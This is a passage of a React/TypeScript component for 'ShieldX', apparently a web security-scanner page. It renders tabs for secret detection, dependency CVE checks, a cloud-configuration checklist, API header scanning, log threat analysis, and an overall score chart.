  const [depsScanning, setDepsScanning] = useState(false);

  // Cloud state
  const [cloudAnswers, setCloudAnswers] = useState<Record<string, boolean | null>>(() => {
    const init: Record<string, boolean | null> = {};
    CLOUD_CHECKS.forEach((c) => (init[c.id] = null));
    return init;
  });

  // API state
  const [apiUrl, setApiUrl] = useState("");
  const [apiResults, setApiResults] = useState<{
    url: string; status: number;
    headers: { name: string; present: boolean; value: string | null; severity: string; status: string; message: string }[];
    apiChecks: { name: string; severity: string; status: string; message: string }[];
    score: number;
  } | null>(null);
  const [apiScanning, setApiScanning] = useState(false);
  const [apiError, setApiError] = useState("");

  // Logs state
  const [logsInput, setLogsInput] = useState("");
  const [logsResults, setLogsResults] = useState<LogFinding[] | null>(null);
  const [logsScanning, setLogsScanning] = useState(false);

  // Scores (derived)
  const scores = calculateScores({
    secrets: secretsResults || [],
    depVulns: depsResults?.vulns || [],
    depTotal: depsResults ? Object.keys(depsResults.deps).length : 0,
    cloudAnswers,
    apiScore: apiResults?.score ?? null,
    logFindings: logsResults || [],
  });

  const radarData = [
    { category: "Secrets", score: scores.secrets },
    { category: "Dependencies", score: scores.deps },
    { category: "Cloud", score: scores.cloud },
    { category: "API", score: scores.api },
    { category: "Logs", score: scores.logs },
  ];

  // RUN DEMO
  const runDemo = useCallback(async () => {
    setIsDemo(true);

    setSecretsInput(DEMO_CODE);
    setSecretsScanning(true);
    await new Promise((r) => setTimeout(r, 800));
    setSecretsResults(scanSecrets(DEMO_CODE));
    setSecretsScanning(false);

    setDepsInput(DEMO_PACKAGE_JSON);
    setDepsScanning(true);
    await new Promise((r) => setTimeout(r, 600));
    setDepsResults(scanDependencies(DEMO_PACKAGE_JSON));
    setDepsScanning(false);

    setCloudAnswers(Object.fromEntries(Object.entries(DEMO_CLOUD_ANSWERS).map(([k, v]) => [k, v])));

    setApiUrl(DEMO_API_URL);
    setApiScanning(true);
    setApiError("");
    try {
      const resp = await fetch("/api/shieldx/scan-api", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: DEMO_API_URL }),
      });
      const data = await resp.json();
      if (data.error) setApiError(data.error);
      else setApiResults(data);
    } catch {
      setApiError("Failed to scan API endpoint");
    }
    setApiScanning(false);

    setLogsInput(DEMO_LOGS);
    setLogsScanning(true);
    await new Promise((r) => setTimeout(r, 700));
    setLogsResults(analyzeLogs(DEMO_LOGS));
    setLogsScanning(false);

    setActiveTab("score");
  }, []);

  // RESET ALL
  const resetAll = useCallback(() => {
    setIsDemo(false);
    setSecretsInput(""); setSecretsResults(null);
    setDepsInput(""); setDepsResults(null);
    setCloudAnswers(() => {
      const i: Record<string, boolean | null> = {};
      CLOUD_CHECKS.forEach((c) => (i[c.id] = null));
      return i;
    });
    setApiUrl(""); setApiResults(null); setApiError("");
    setLogsInput(""); setLogsResults(null);
    setActiveTab("secrets");
  }, []);

  // Scanner actions
  const runSecretsScan = () => {
    setSecretsScanning(true);
    setTimeout(() => { setSecretsResults(scanSecrets(secretsInput)); setSecretsScanning(false); }, 500);
  };

  const runDepsScan = () => {
    setDepsScanning(true);
    setTimeout(() => { setDepsResults(scanDependencies(depsInput)); setDepsScanning(false); }, 500);
  };

  const runApiScan = async () => {
    if (!apiUrl.trim()) return;
    setApiScanning(true); setApiError(""); setApiResults(null);
    try {
      const resp = await fetch("/api/shieldx/scan-api", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: apiUrl }),
      });
      const data = await resp.json();
      if (data.error) setApiError(data.error);
      else setApiResults(data);
    } catch {
      setApiError("Failed to scan endpoint");
    }
    setApiScanning(false);
  };

  const runLogsScan = () => {
    setLogsScanning(true);
    setTimeout(() => { setLogsResults(analyzeLogs(logsInput)); setLogsScanning(false); }, 500);
  };

  const severityColor = (s: string) => {
    if (s === "critical") return "text-red-500";
    if (s === "high") return "text-orange-500";
    if (s === "medium") return "text-yellow-500";
    return "text-green-500";
  };
  const severityBg = (s: string) => {
    if (s === "critical") return "bg-red-500/10 border-red-500/20";
    if (s === "high") return "bg-orange-500/10 border-orange-500/20";
    if (s === "medium") return "bg-yellow-500/10 border-yellow-500/20";
    return "bg-green-500/10 border-green-500/20";
  };
  const statusIcon = (s: string) => {
    if (s === "pass") return <CheckCircle2 className="h-4 w-4 text-emerald-500" />;
    if (s === "fail") return <XCircle className="h-4 w-4 text-red-500" />;
    return <AlertTriangle className="h-4 w-4 text-yellow-500" />;
  };

  const hasAnyResults = secretsResults !== null || depsResults !== null || apiResults !== null || logsResults !== null ||
    Object.values(cloudAnswers).some((v) => v !== null);

  return (
    <div className="py-8 sm:py-12">
      <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">

        {/* HEADER */}
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="text-center mb-10">
          <Badge className="mb-4 gap-1.5 bg-primary/10 text-primary border-primary/20 px-3 py-1">
            <Shield className="h-3.5 w-3.5" /> Real Security Scanner
          </Badge>
          <h1 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold tracking-tight">
            SCR{" "}
            <span className="bg-gradient-to-r from-primary via-blue-500 to-cyan-500 bg-clip-text text-transparent">
              ShieldX
            </span>
          </h1>
          <p className="mt-3 text-lg text-muted-foreground max-w-2xl mx-auto">
            Scan your code for secrets, check dependencies for CVEs, audit cloud configuration,
            test API endpoints, and analyze logs — all in your browser.
          </p>

          <div className="mt-6 flex justify-center gap-3">
            <Button size="lg" onClick={runDemo} className="gap-2" disabled={secretsScanning || depsScanning || apiScanning || logsScanning}>
              <Play className="h-4 w-4" /> Run Full Demo
            </Button>
            {hasAnyResults && (
              <Button size="lg" variant="outline" onClick={resetAll} className="gap-2">
                <RotateCcw className="h-4 w-4" /> Reset All
              </Button>
            )}
          </div>
          {isDemo && (
            <p className="mt-2 text-sm text-muted-foreground">
              Demo mode — using sample vulnerable data to showcase all scanners
            </p>
          )}
        </motion.div>

        {/* TAB NAV */}
        <div className="flex flex-wrap justify-center gap-2 mb-8">
          {TABS.map((tab) => {
            const active = activeTab === tab.key;
            return (
              <button
                key={tab.key}
                onClick={() => setActiveTab(tab.key)}
                className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-medium transition-all ${
                  active
                    ? "bg-primary text-primary-foreground shadow-md"
                    : "bg-muted/50 text-muted-foreground hover:bg-muted hover:text-foreground"
                }`}
              >
                <tab.icon className="h-4 w-4" />
                {tab.label}
                {tab.key === "secrets" && secretsResults && secretsResults.length > 0 && (
                  <span className="ml-1 bg-red-500 text-white text-xs rounded-full px-1.5 py-0.5">{secretsResults.length}</span>
                )}
                {tab.key === "deps" && depsResults && depsResults.vulns.length > 0 && (
                  <span className="ml-1 bg-red-500 text-white text-xs rounded-full px-1.5 py-0.5">{depsResults.vulns.length}</span>
                )}
                {tab.key === "logs" && logsResults && logsResults.length > 0 && (
                  <span className="ml-1 bg-red-500 text-white text-xs rounded-full px-1.5 py-0.5">{logsResults.length}</span>
                )}
              </button>
            );
          })}
        </div>

        {/* TAB CONTENT */}
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            transition={{ duration: 0.25 }}
          >

            {/* SECRETS SCANNER */}
            {activeTab === "secrets" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Key className="h-5 w-5 text-red-500" />
                    Secrets Exposure Scanner
                    <Badge variant="outline" className="ml-2 text-xs">{SECRET_PATTERNS.length} pattern types</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Paste your source code, config files, or .env content. The scanner checks for API keys, tokens, passwords,
                    connection strings, and private keys using {SECRET_PATTERNS.length} regex patterns.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <Textarea
                    placeholder="Paste your code, config, or .env file here..."
                    className="font-mono text-sm min-h-[200px]"
                    value={secretsInput}
                    onChange={(e) => setSecretsInput(e.target.value)}
                  />
                  <Button onClick={runSecretsScan} disabled={!secretsInput.trim() || secretsScanning} className="gap-2">
                    {secretsScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Search className="h-4 w-4" />}
                    {secretsScanning ? "Scanning..." : "Scan for Secrets"}
                  </Button>

                  {secretsResults !== null && (
                    <div className="mt-6">
                      {secretsResults.length === 0 ? (
                        <div className="flex items-center gap-3 p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                          <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                          <div>
                            <div className="font-semibold text-emerald-600 dark:text-emerald-400">No secrets detected</div>
                            <div className="text-sm text-muted-foreground">Your code appears clean of hardcoded credentials.</div>
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          <div className="flex items-center gap-2">
                            <AlertTriangle className="h-5 w-5 text-red-500" />
                            <span className="font-bold text-red-500">{secretsResults.length} secret(s) detected</span>
                          </div>
                          {secretsResults.map((f, i) => (
                            <div key={i} className={`rounded-lg border p-4 ${severityBg(f.severity)}`}>
                              <div className="flex items-center justify-between mb-2">
                                <div className="flex items-center gap-2">
                                  <Eye className={`h-4 w-4 ${severityColor(f.severity)}`} />
                                  <span className="font-semibold text-sm">{f.pattern}</span>
                                </div>
                                <div className="flex items-center gap-2">
                                  <Badge variant={f.severity === "critical" ? "destructive" : "outline"} className="text-xs">{f.severity}</Badge>
                                  <span className="text-xs text-muted-foreground">Line {f.line}</span>
                                </div>
                              </div>
                              <div className="font-mono text-xs bg-background/50 rounded px-3 py-2 mb-2 break-all">{f.match}</div>
                              <div className="flex items-start gap-2 text-sm">
                                <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> {f.fix}</span>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* DEPENDENCY SCANNER */}
            {activeTab === "deps" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Package className="h-5 w-5 text-orange-500" />
                    Dependency Vulnerability Scanner
                    <Badge variant="outline" className="ml-2 text-xs">{KNOWN_VULNS.length} CVEs in database</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Paste your package.json, requirements.txt, or build.gradle. The scanner checks all dependencies against
                    a database of {KNOWN_VULNS.length} known CVEs across Node.js, Python, Java, and Go.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <Textarea
                    placeholder={`Paste your package.json, requirements.txt, or build.gradle...\n\nExample:\n{\n  "dependencies": {\n    "lodash": "^4.17.20"\n  }\n}`}
                    className="font-mono text-sm min-h-[200px]"
                    value={depsInput}
                    onChange={(e) => setDepsInput(e.target.value)}
                  />
                  <Button onClick={runDepsScan} disabled={!depsInput.trim() || depsScanning} className="gap-2">
                    {depsScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Search className="h-4 w-4" />}
                    {depsScanning ? "Scanning..." : "Scan Dependencies"}
                  </Button>

                  {depsResults !== null && (
                    <div className="mt-6 space-y-4">
                      <div className="text-sm text-muted-foreground">
                        Parsed <strong>{Object.keys(depsResults.deps).length}</strong> dependencies
                      </div>

                      {depsResults.vulns.length === 0 ? (
                        <div className="flex items-center gap-3 p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                          <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                          <div>
                            <div className="font-semibold text-emerald-600 dark:text-emerald-400">No known vulnerabilities</div>
                            <div className="text-sm text-muted-foreground">All detected dependencies are on safe versions.</div>
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          <div className="flex items-center gap-2">
                            <AlertTriangle className="h-5 w-5 text-orange-500" />
                            <span className="font-bold text-orange-500">{depsResults.vulns.length} vulnerable package(s)</span>
                          </div>
                          {depsResults.vulns.map((v, i) => (
                            <div key={i} className={`rounded-lg border p-4 ${severityBg(v.severity)}`}>
                              <div className="flex items-center justify-between mb-2">
                                <span className="font-semibold">{v.package} <span className="text-sm text-muted-foreground">v{v.version}</span></span>
                                <Badge variant={v.severity === "critical" ? "destructive" : "outline"} className="text-xs">{v.severity}</Badge>
                              </div>
                              <div className="text-sm font-mono text-muted-foreground mb-1">{v.cve}</div>
                              <div className="text-sm mb-2">{v.description}</div>
                              <div className="flex items-start gap-2 text-sm">
                                <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> {v.fix}</span>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* CLOUD SECURITY */}
            {activeTab === "cloud" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Cloud className="h-5 w-5 text-sky-500" />
                    Cloud Security Assessment
                    <Badge variant="outline" className="ml-2 text-xs">{CLOUD_CHECKS.length} checks</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Answer each question about your cloud infrastructure. ShieldX calculates a security score and provides
                    specific fix guidance for every failing check.
                  </p>
                </CardHeader>
                <CardContent>
                  {(["AWS", "GCP", "Azure", "General"] as const).map((platform) => {
                    const checks = CLOUD_CHECKS.filter((c) => c.platform === platform);
                    const answered = checks.filter((c) => cloudAnswers[c.id] !== null);
                    const passed = answered.filter((c) => cloudAnswers[c.id] === true);
                    return (
                      <div key={platform} className="mb-8 last:mb-0">
                        <div className="flex items-center justify-between mb-3">
                          <h3 className="text-lg font-bold flex items-center gap-2">
                            {platform === "AWS" ? "☁️" : platform === "GCP" ? "🌐" : platform === "Azure" ? "🔷" : "🌍"} {platform}
                          </h3>
                          {answered.length > 0 && (
                            <span className="text-sm text-muted-foreground">{passed.length}/{answered.length} passing</span>
                          )}
                        </div>
                        <div className="space-y-3">
                          {checks.map((check) => {
                            const answer = cloudAnswers[check.id];
                            const isFail = answer === false;
                            return (
                              <div key={check.id} className={`rounded-lg border p-4 transition-colors ${
                                answer === null ? "border-border" : answer ? "bg-emerald-500/5 border-emerald-500/20" : "bg-red-500/5 border-red-500/20"
                              }`}>
                                <div className="flex items-start justify-between gap-4">
                                  <div className="flex-1">
                                    <div className="flex items-center gap-2 mb-1">
                                      <Badge variant="outline" className={`text-[10px] ${
                                        check.severity === "critical" ? "text-red-500 border-red-500/30" :
                                        check.severity === "high" ? "text-orange-500 border-orange-500/30" :
                                        "text-yellow-500 border-yellow-500/30"
                                      }`}>{check.severity}</Badge>
                                      <Badge variant="outline" className="text-[10px]">{check.category}</Badge>
                                    </div>
                                    <p className="text-sm font-medium">{check.question}</p>
                                  </div>
                                  <div className="flex gap-2 shrink-0">
                                    <button
                                      onClick={() => setCloudAnswers((prev) => ({ ...prev, [check.id]: true }))}
                                      className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
                                        answer === true
                                          ? "bg-emerald-500 text-white"
                                          : "bg-muted hover:bg-emerald-500/20 text-muted-foreground"
                                      }`}
                                    >Yes</button>
                                    <button
                                      onClick={() => setCloudAnswers((prev) => ({ ...prev, [check.id]: false }))}
                                      className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
                                        answer === false
                                          ? "bg-red-500 text-white"
                                          : "bg-muted hover:bg-red-500/20 text-muted-foreground"
                                      }`}
                                    >No</button>
                                  </div>
                                </div>
                                {isFail && (
                                  <div className="mt-3 space-y-1">
                                    <p className="text-sm text-red-500">{check.failMessage}</p>
                                    <div className="flex items-start gap-2 text-sm">
                                      <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                      <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> {check.fix}</span>
                                    </div>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    );
                  })}
                </CardContent>
              </Card>
            )}

            {/* API SCANNER */}
            {activeTab === "api" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Globe className="h-5 w-5 text-violet-500" />
                    API Security Scanner
                    <Badge variant="outline" className="ml-2 text-xs">Live endpoint scan</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Enter any URL. ShieldX makes a real HTTP request to check security headers, CORS, authentication,
                    rate limiting, sensitive data exposure, and error leakage.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex gap-3">
                    <Input
                      placeholder="https://api.example.com/v1/health"
                      value={apiUrl}
                      onChange={(e) => setApiUrl(e.target.value)}
                      onKeyDown={(e) => e.key === "Enter" && runApiScan()}
                      className="font-mono"
                    />
                    <Button onClick={runApiScan} disabled={!apiUrl.trim() || apiScanning} className="gap-2 shrink-0">
                      {apiScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Search className="h-4 w-4" />}
                      {apiScanning ? "Scanning..." : "Scan Endpoint"}
                    </Button>
                  </div>

                  {apiError && (
                    <div className="flex items-center gap-2 p-3 rounded-lg bg-red-500/10 border border-red-500/20 text-red-500 text-sm">
                      <XCircle className="h-4 w-4 shrink-0" /> {apiError}
                    </div>
                  )}

                  {apiResults && (
                    <div className="mt-6 space-y-6">
                      <div className="flex items-center justify-between">
                        <div>
                          <span className="font-mono text-sm">{apiResults.url}</span>
                          <span className="ml-2 text-sm text-muted-foreground">Status: {apiResults.status}</span>
                        </div>
                        <div className="text-right">
                          <div className="text-2xl font-bold text-primary">{apiResults.score}<span className="text-sm text-muted-foreground">/10</span></div>
                          <div className="text-xs text-muted-foreground">API Score</div>
                        </div>
                      </div>

                      <div>
                        <h4 className="text-sm font-bold mb-3">Security Headers ({apiResults.headers.filter((h) => h.status === "pass").length}/{apiResults.headers.length} passing)</h4>
                        <div className="space-y-2">
                          {apiResults.headers.map((h, i) => (
                            <div key={i} className="flex items-center gap-3 text-sm p-2 rounded-lg border border-border/50">
                              {statusIcon(h.status)}
                              <span className="font-mono font-medium w-48 shrink-0">{h.name}</span>
                              <span className="text-muted-foreground flex-1 truncate">{h.message}</span>
                              <Badge variant="outline" className={`text-[10px] ${severityColor(h.severity)}`}>{h.severity}</Badge>
                            </div>
                          ))}
                        </div>
                      </div>

                      <div>
                        <h4 className="text-sm font-bold mb-3">API Security Checks ({apiResults.apiChecks.filter((c) => c.status === "pass").length}/{apiResults.apiChecks.length} passing)</h4>
                        <div className="space-y-2">
                          {apiResults.apiChecks.map((c, i) => (
                            <div key={i} className="flex items-center gap-3 text-sm p-2 rounded-lg border border-border/50">
                              {statusIcon(c.status)}
                              <span className="font-medium w-48 shrink-0">{c.name}</span>
                              <span className="text-muted-foreground flex-1">{c.message}</span>
                              <Badge variant="outline" className={`text-[10px] ${severityColor(c.severity)}`}>{c.severity}</Badge>
                            </div>
                          ))}
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* LOG ANALYZER */}
            {activeTab === "logs" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Brain className="h-5 w-5 text-purple-500" />
                    AI Threat Log Analyzer
                    <Badge variant="outline" className="ml-2 text-xs">7 pattern categories</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Paste application logs, access logs, or syslog output. The analyzer detects brute force attempts,
                    injection attacks, privilege escalation, data exfiltration, error spikes, and suspicious IP activity.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <Textarea
                    placeholder={`Paste your logs here...\n\nSupports: application logs, access logs, syslog, error logs\n\nExample:\n2026-03-14 10:15:22 [WARN] Failed login for user admin from 185.143.223.47`}
                    className="font-mono text-sm min-h-[200px]"
                    value={logsInput}
                    onChange={(e) => setLogsInput(e.target.value)}
                  />
                  <Button onClick={runLogsScan} disabled={!logsInput.trim() || logsScanning} className="gap-2">
                    {logsScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Brain className="h-4 w-4" />}
                    {logsScanning ? "Analyzing..." : "Analyze Logs"}
                  </Button>

                  {logsResults !== null && (
                    <div className="mt-6">
                      {logsResults.length === 0 ? (
                        <div className="flex items-center gap-3 p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                          <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                          <div>
                            <div className="font-semibold text-emerald-600 dark:text-emerald-400">No threats detected</div>
                            <div className="text-sm text-muted-foreground">Logs appear clean. Continue monitoring.</div>
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          <div className="flex items-center gap-2">
                            <Activity className="h-5 w-5 text-purple-500" />
                            <span className="font-bold text-purple-500">{logsResults.length} threat(s) identified</span>
                          </div>
                          {logsResults.map((f, i) => (
                            <div key={i} className={`rounded-lg border p-4 ${severityBg(f.severity)}`}>
                              <div className="flex items-center justify-between mb-2">
                                <span className="font-semibold text-sm">{f.type}</span>
                                <Badge variant={f.severity === "critical" ? "destructive" : "outline"} className="text-xs">{f.severity}</Badge>
                              </div>
                              <p className="text-sm mb-2">{f.details}</p>
                              <div className="font-mono text-xs bg-background/50 rounded px-3 py-2 mb-2 whitespace-pre-wrap">{f.evidence}</div>
                              <div className="flex items-start gap-2 text-sm">
                                <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> {f.fix}</span>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* SECURITY SCORE */}
            {activeTab === "score" && (
              <div className="space-y-6">
                <Card className="border-2 border-primary/20">
                  <CardContent className="p-8">
                    <div className="grid lg:grid-cols-2 gap-8 items-center">
                      <div className="text-center lg:text-left">
                        <h2 className="text-lg font-bold text-muted-foreground mb-2">Overall Security Score</h2>
                        <div className="text-7xl font-extrabold">
                          <span className={
                            scores.overall >= 8 ? "text-emerald-500" :
                            scores.overall >= 6 ? "text-yellow-500" :
                            scores.overall >= 4 ? "text-orange-500" :
                            "text-red-500"
                          }>
                            {scores.overall}
                          </span>
                          <span className="text-2xl text-muted-foreground">/10</span>
                        </div>
                        <p className="text-sm text-muted-foreground mt-2">
                          {scores.overall >= 8 ? "Excellent — your security posture is strong" :
                           scores.overall >= 6 ? "Fair — some issues need attention" :
                           scores.overall >= 4 ? "Poor — multiple vulnerabilities found" :
                           "Critical — immediate action required"}
                        </p>
                        {!hasAnyResults && (
                          <p className="text-sm text-muted-foreground mt-4 italic">
                            Run scanners in other tabs or click &quot;Run Full Demo&quot; to see a real score.
                          </p>
                        )}
                      </div>

                      <div className="h-[280px]">
                        <ResponsiveContainer width="100%" height="100%">
                          <RadarChart data={radarData}>
                            <PolarGrid stroke="hsl(var(--border))" />
                            <PolarAngleAxis dataKey="category" tick={{ fill: "hsl(var(--muted-foreground))", fontSize: 12 }} />
                            <PolarRadiusAxis angle={90} domain={[0, 10]} tick={{ fill: "hsl(var(--muted-foreground))", fontSize: 10 }} />
                            <Radar name="Score" dataKey="score" stroke="hsl(var(--primary))" fill="hsl(var(--primary))" fillOpacity={0.3} strokeWidth={2} />
                          </RadarChart>
                        </ResponsiveContainer>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                <div className="grid sm:grid-cols-2 lg:grid-cols-5 gap-4">
                  {[
                    { label: "Secrets", score: scores.secrets, icon: Key, color: "text-red-500", tab: "secrets" as TabKey },
                    { label: "Dependencies", score: scores.deps, icon: Package, color: "text-orange-500", tab: "deps" as TabKey },
                    { label: "Cloud", score: scores.cloud, icon: Cloud, color: "text-sky-500", tab: "cloud" as TabKey },
                    { label: "API", score: scores.api, icon: Globe, color: "text-violet-500", tab: "api" as TabKey },
                    { label: "Logs", score: scores.logs, icon: Brain, color: "text-purple-500", tab: "logs" as TabKey },
                  ].map((cat, i) => (
                    <Card key={i} className="cursor-pointer hover:border-primary/30 transition-colors" onClick={() => setActiveTab(cat.tab)}>
                      <CardContent className="p-4 text-center">
                        <cat.icon className={`h-6 w-6 mx-auto mb-2 ${cat.color}`} />
                        <div className="text-2xl font-bold">{cat.score}<span className="text-sm text-muted-foreground">/10</span></div>
                        <div className="text-sm text-muted-foreground">{cat.label}</div>
                        <div className="mt-2 h-1.5 rounded-full bg-muted overflow-hidden">
                          <div
                            className={`h-full rounded-full transition-all duration-1000 ${
                              cat.score >= 8 ? "bg-emerald-500" : cat.score >= 6 ? "bg-yellow-500" : cat.score >= 4 ? "bg-orange-500" : "bg-red-500"
                            }`}
                            style={{ width: `${cat.score * 10}%` }}
                          />
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>

                {hasAnyResults && (
                  <Card>
                    <CardHeader>
                      <CardTitle className="text-lg">Scan Summary</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4 text-sm">
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Secrets Found</div>
                          <div className="text-2xl font-bold">{secretsResults?.length ?? "—"}</div>
                        </div>
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Vulnerable Packages</div>
                          <div className="text-2xl font-bold">{depsResults?.vulns.length ?? "—"}</div>
                        </div>
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Cloud Issues</div>
                          <div className="text-2xl font-bold">
                            {Object.values(cloudAnswers).some((v) => v !== null)
                              ? Object.values(cloudAnswers).filter((v) => v === false).length
                              : "—"}
                          </div>
                        </div>
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Log Threats</div>
                          <div className="text-2xl font-bold">{logsResults?.length ?? "—"}</div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                <div className="text-center py-8">
                  <p className="text-muted-foreground mb-4">
                    Need help fixing these issues? Our security experts can help.
                  </p>
                  <div className="flex justify-center gap-3">
                    <Link href="/contact">
                      <Button className="gap-2">Get Expert Help <ArrowRight className="h-4 w-4" /></Button>
                    </Link>
                    <Link href="/services">
                      <Button variant="outline" className="gap-2">View Services</Button>
                    </Link>
                  </div>
                </div>
              </div>
            )}

          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
}
